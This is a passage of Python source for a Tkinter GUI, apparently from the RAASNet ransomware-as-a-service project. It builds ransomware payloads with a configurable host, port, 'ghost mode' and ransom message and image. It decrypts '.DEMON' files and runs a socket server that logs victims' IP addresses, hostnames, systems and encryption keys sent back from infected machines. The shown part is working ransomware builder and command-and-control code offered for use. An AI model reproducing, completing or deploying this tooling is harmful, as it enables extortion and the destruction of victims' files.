            messagebox.showwarning('ERROR', 'Failed to compile!\n\n%s' % e)

    def select_icon(self):
        self.options['icon_path'].set(askopenfilename(initialdir = "./", title = 'Select Icon...', filetypes = (('Icon Files', '*.ico'), ('All Files', '*.*'))))

    def select_payload(self):
        self.options['payload_path'].set(askopenfilename(initialdir = "./", title = 'Select Payload...', filetypes = (('Python Files', '*.py'), ('All Files', '*.*'))))

    def generate(self):
        self.gen = Toplevel()
        self.gen.title(string = 'Generate Payload')
        self.gen.configure(background = 'white')
        self.gen.resizable(0,0)

        self.gen.bind("<Escape>", self.close_generate) # Press ESC to close window

        mode_frame = LabelFrame(self.gen, text = 'Mode')
        mode_frame.grid(row = 0, column = 0)
        Radiobutton(mode_frame, text = 'GUI', variable = self.options['mode'], value = 1).grid(row = 0, column = 0, sticky = 'w')
        Radiobutton(mode_frame, text = 'Console', variable = self.options['mode'], value = 2, command = self.check_settings).grid(row = 1, column = 0, sticky = 'w')
        Checkbutton(mode_frame, text = "Fullscreen mode", variable = self.options['full_screen_var'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 1, sticky = 'w')

        server_frame = LabelFrame(self.gen, text = 'Remote Server')
        server_frame.grid(row = 0, column = 1)
        Label(server_frame, text = 'Host:').grid(row = 0, column = 0, sticky = 'w')
        Entry(server_frame, textvariable = self.options['host'], width = 20).grid(row = 0, column = 1)
        Label(server_frame, text = 'Port:').grid(row = 1, column = 0, sticky = 'w')
        Entry(server_frame, textvariable = self.options['port'], width = 20).grid(row = 1, column = 1)

        options_frame = LabelFrame(self.gen, text = 'Options')
        options_frame.grid(row = 1, column = 0)
        Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0)
        Checkbutton(options_frame, text = 'Ghost mode', variable = self.options['ghost'], onvalue = 1, offvalue = 0).grid(row = 0, column = 1)

        content_frame = LabelFrame(self.gen, text = 'Content')
        content_frame.grid(row = 1, column = 1)
        set_msg = Button(content_frame, text = 'CUSTOM MESSAGE', command = self.set_msg, width = 25).grid(row = 0, column = 0)
        set_img = Button(content_frame, text = 'CUSTOM IMAGE', command = self.set_img, width = 25).grid(row = 1, column = 0)

        finish_frame = LabelFrame(self.gen, text = 'Finish')
        finish_frame.grid(row = 2, column = 0, columnspan = 2)
        generate = Button(finish_frame, text = "GENERATE", command = self.make_demon, width = 50).grid(row = 0, column = 0)

    def set_img(self):
        try:
            f = base64.b64encode(open(askopenfilename(initialdir = "./", title = 'Select Image...', filetypes = ([('Image Files', '*.png *.jpg')])), 'rb').read()).decode('utf-8')
        except FileNotFoundError:
            return

        self.options['img_base64'].set(f)

    def set_msg(self):
        self.message = Toplevel()
        self.message.title(string = 'Set Custom Message')
        self.message.configure(background = 'white')
        self.message.resizable(0,0)

        self.message.bind("<Escape>", self.close_set_msg)

        self.options['new_msg'] = Text(self.message, height = 25, width = 100)
        self.options['new_msg'].grid(row = 0, column = 0)
        save = Button(self.message, text = 'SAVE', command = self.change_msg, width = 50).grid(row = 1, column = 0)

        self.options['new_msg'].insert(END, self.options['msg'].get())
        self.options['new_msg'].focus()

    def change_msg(self):
        self.options['msg'].set(self.options['new_msg'].get('1.0', END))
        self.message.destroy()

    def check_settings(self):
        if self.options['mode'].get() == 2:
            self.options['full_screen_var'].set(0)
            self.options['demo'].set(0)
            messagebox.showwarning('Disabled', 'Fullscreen and Demo mode are available for GUI mode only, these options have been automaticly disabled!')

    def make_demon(self):
        try:
            create_demon(self.options['host'].get(),
                self.options['port'].get(),
                self.options['full_screen_var'].get(),
                self.options['demo'].get(),
                self.options['ghost'].get(),
                self.options['msg'].get(),
                self.options['img_base64'].get())
            messagebox.showinfo('SUCCESS', 'Payload successfully generated!\n\nFile saved to ./payload.py')
            self.gen.destroy()
        except Exception as e:
            messagebox.showwarning('ERROR', 'Failed to generate payload!\n\n%s' % e)

    def decrypt_files(self):
        key = dec_key()
        key = key.encode('utf-8')
        if key == False:
            return

        p = dec_path()
        if p == False:
            return


        try:
            counter = 0
            for path, subdirs, files in os.walk(p):
                for name in files:
                    if name.endswith(".DEMON"):
                        decrypt_file(os.path.join(path, name), key)
                        print("[Decrypting] %s" % name)
                        counter+=1
                        os.remove(os.path.join(path, name))
                    else:
                        print("[Skipped] %s" % name)
            print("\n[DONE] Decrypted %i files" % counter)

        except KeyboardInterrupt:
            print("\nInterrupted!\n")
            sys.exit(0)
        except Exception as e:
            print("\n[ ERROR ] %s" % e)
            sys.exit(1)

    def start_thread(self):
        # Start server as thread
        thread = threading.Thread(target=self.start_server)
        thread.daemon = True
        thread.start()

    def start_server(self):
        host = self.options['host'].get()
        port = self.options['port'].get()
        socket_list = []

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(10)

        # add server socket object to the list of readable connections
        socket_list.append(server_socket)

        self.insert_banner()
        self.serv.options['log'].insert('1.0', "Server started on port [%s] [%s]\nWaiting...\n" % (host, int(port)), 'deeppink')

        try:
            while True:
                ready_to_read,ready_to_write,in_error = select.select(socket_list,[],[],0)

                for sock in ready_to_read:
                    # a new connection request recieved
                    if sock == server_socket:
                        sockfd, addr = server_socket.accept()
                        socket_list.append(sockfd)
                    else:
                        try:
                            data = sock.recv(1024)
                            if data:
                                data = data.decode('UTF-8')
                                ip = addr[0]
                                local = data.split('$')[0]
                                system = data.split('$')[1]
                                key = data.split('$')[2]

                                self.serv.options['log'].insert(END, '\n[%s %s] %s %s %s %s' % (time.strftime('%d/%m/%Y'), time.strftime('%X'), ip.ljust(20), local.ljust(20), system.ljust(20), key), 'yellow')
                                self.serv.options['log'].see(END)

                            else:
                                if sock in socket_list:
                                    socket_list.remove(sock)
                        except:
                            continue
        except KeyboardInterrupt:
            print('Closed...\n')


        server_socket.close()

    def insert_banner(self):
        banner = '''
                         .:'                                  `:.
                         ::'                                    `::
                        :: :.                                  .: ::
                         `:. `:.             .             .:'  .:'
                          `::. `::           !           ::' .::'
                              `::.`::.    .' ! `.    .::'.::'
                                `:.  `::::'':!:``::::'   ::'
                                :'*:::.  .:' ! `:.  .:::*`:
                               :: HHH::.   ` ! '   .::HHH ::
                              ::: `H TH::.  `!'  .::HT H' :::
                              ::..  `THHH:`:   :':HHHT'  ..::
                              `::      `T: `. .' :T'      ::'
                                `:. .   :         :   . .:'
                                  `::'               `::'
                                    :'  .`.  .  .'.  `:
                                    :' ::.       .:: `:
                                    :' `:::     :::' `:
                                     `.  ``     ''  .'
                                      :`...........':
                                      ` :`.     .': '
                                       `:  `"""'  :'
         ______   _______  _______  _______  _                 _______  _______  _______
        (  __  \ (  ____ \(       )(  ___  )( (    /||\     /|(  ___  )(  ____ )(  ____ \\
        | (  \  )| (    \/| () () || (   ) ||  \  ( || )   ( || (   ) || (    )|| (    \/
        | |   ) || (__    | || || || |   | ||   \ | || | _ | || (___) || (____)|| (__
        | |   | ||  __)   | |(_)| || |   | || (\ \) || |( )| ||  ___  ||     __)|  __)
        | |   ) || (      | |   | || |   | || | \   || || || || (   ) || (\ (   | (
        | (__/  )| (____/\| )   ( || (___) || )  \  || () () || )   ( || ) \ \__| (____/\\
        (______/ (_______/|/     \|(_______)|/    )_)(_______)|/     \||/   \__/(_______/
        '''

        self.serv.options['log'].insert('1.0', banner + '\n', 'red')

    def close_server(self, event):
        self.serv.destroy()

    def close_compile(self, event):
        self.comp.destroy()

    def close_generate(self, event):
        self.gen.destroy()

    def close_set_msg(self, event):
        self.message.destroy()

    def open_github(self):
        webbrowser.open_new_tab('https://www.github.com/leonv024/RAASNet')

    def exit(self):
        sys.exit(0)

    def exit_event(self, event):
        exit(0)

    def show_license(self):
        self.withdraw()

        try:
            license = open('./LICENSE', 'r').read()
        except FileNotFoundError:

            messagebox.showwarning('ERROR', 'This product comes with a license but the license was not found in your installation directory.\n\nPlease, download this product from the official source only!')
            sys.exit(1)

        self.lic = Toplevel()
        self.lic.title(string = 'LICENSE AGREEMENT')
        self.lic.configure(background = 'white')
        self.lic.resizable(0,0)

        self.options['license'] = Text(self.lic, height = 25, width = 80)
        self.options['license'].grid(row = 0, column = 0, columnspan = 2)
        decline = Button(self.lic, text = 'DECLINE', command = self.decline_license, width = 25).grid(row = 1, column = 0)
        agree = Button(self.lic, text = 'AGREE', command = self.agree_license, width = 25).grid(row = 1, column = 1)

        self.options['license'].insert('1.0', license)

    def decline_license(self):
        messagebox.showwarning('DECLINED', 'You rejected the license.\n\nYou are not allowed to use this software.\n\nRelaunch it and click "agree" if you changed your mind.\n\nThis program will now exit... Goodbye!')
        sys.exit(0)

    def agree_license(self):
        f = open(sys.argv[0], 'r').read()
        f = f.replace("#<activate>", "self.options['agreed'].set(1)", 1)
        with open(sys.argv[0], 'w') as w:
            w.write(f)
            w.close()

        self.deiconify()
        self.lic.destroy()



    def view_license(self):
        messagebox.showinfo('License', 'Software: Free (Public Test)\nLicense: GNU General Public License v3.0')

main = MainWindow()
main.mainloop()
